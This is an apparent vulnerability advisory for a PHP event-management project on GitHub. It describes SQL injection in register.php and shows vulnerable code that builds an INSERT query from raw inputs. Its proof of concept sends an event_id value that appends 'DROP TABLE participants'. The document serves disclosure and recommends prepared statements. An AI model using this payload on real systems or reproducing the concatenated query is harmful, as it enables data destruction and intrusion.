# software link: https://github.com/PuneethReddyHC/event-management
# vendor : https://github.com/PuneethReddyHC


# Vulnerability Description:

The code in register.php is vulnerable to SQL injection, allowing an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database. Additionally, the code lacks proper input validation and sanitization, making it susceptible to various forms of attacks such as cross-site scripting (XSS) and potential security risks.


## Proof of Concept (PoC):

### SQL Injection:
The vulnerability can be exploited by an attacker by manipulating the input parameters. For example, the event_id parameter is directly used in the SQL query without proper validation or parameterization:

An attacker can manipulate the event_id parameter in the HTTP request to inject malicious SQL code.

#### PoC:

```
POST /event-management-master/backend/register.php HTTP/1.1
Host: localhost

event_id=1'; DROP TABLE participants; --
```
This could result in a SQL query like:

```
INSERT INTO `participants` (`p_id`,`event_id`, `fullname`, `email`, `mobile`,  `college`, `branch`) 
VALUES (NULL,'1'; DROP TABLE participants; --', 'test', 'test@gmail.com', '0555555555', 'asd', 'qwe')
```

To mitigate this, use prepared statements or parameterized queries to ensure proper sanitization of user inputs.


## Vulnerable code section:
```
// ... (other code)

if(empty($full_name)  || empty($email)  || empty($mobile)) {
    // Error messages and actions for incomplete data
} else {
    if(!preg_match($name,$full_name)){
        // Error messages and actions for invalid full name
    }

    // Additional regex checks for email and mobile format

    // Verifying mobile number length
    if(!(strlen($mobile) == 10)){
        // Error message and action for invalid mobile number length
    }

    // Database insertion operation
    $sql = "INSERT INTO `participants` 
            (`p_id`,`event_id`, `fullname`, `email`, 
             `mobile`,  `college`, `branch`) 
            VALUES (NULL,'$event_id', '$full_name',  '$email', 
             '$mobile', '$college', '$branch')";
            
    if(mysqli_query($con,$sql)){
        // Successful registration message
        echo "register_success";
        echo "<script> location.href='index.php'; </script>";
        exit;
    }
}

// ... (other code)

```
